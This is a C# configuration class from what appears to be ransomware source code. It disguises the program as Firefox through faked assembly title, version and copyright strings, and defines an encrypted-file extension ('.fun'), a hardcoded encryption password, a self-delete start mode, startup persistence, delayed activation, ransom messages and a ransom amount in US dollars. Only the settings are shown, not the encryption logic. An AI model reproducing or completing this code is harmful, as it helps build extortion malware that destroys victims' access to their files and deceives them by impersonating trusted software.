using System;
using Main.Tools;

namespace Main;

internal static class Config
{
	internal enum StartModeType
	{
		Debug,
		ErrorMessage,
		NothingHappens,
		DeleteItself
	}

	internal const string AssemblyProdutAndTitle = "Firefox";

	internal const string AssemblyCopyright = "Copyright 1999-2012 Firefox and Mozzilla developers. All rights reserved.";

	internal const string AssemblyVersion = "37.0.2.5583";

	internal const string EncryptionFileExtension = ".fun";

	internal const int MaxFilesizeToEncryptInBytes = 10000000;

	internal const string EncryptionPassword = "OoIsAwwF23cICQoLDA0ODe==";

	internal static StartModeType StartMode;

	internal static string ErrorMessage;

	internal static string ErrorTitle;

	internal static Windows.StartupMethodType StartupMethod;

	internal static string TempExeRelativePath;

	internal static string TempExePath;

	internal static string FinalExeRelativePath;

	internal static string FinalExePath;

	internal static string WorkFolderRelativePath;

	internal static string WorkFolderPath;

	internal static bool OnlyRunAfterSysRestart;

	internal static DateTime ActiveAfterDateTime;

	internal static bool Activated;

	internal static int TimerActivateCheckerInterval;

	internal static string WelcomeMessage;

	internal static string TaskMessage;

	internal static int RansomUsd;
}
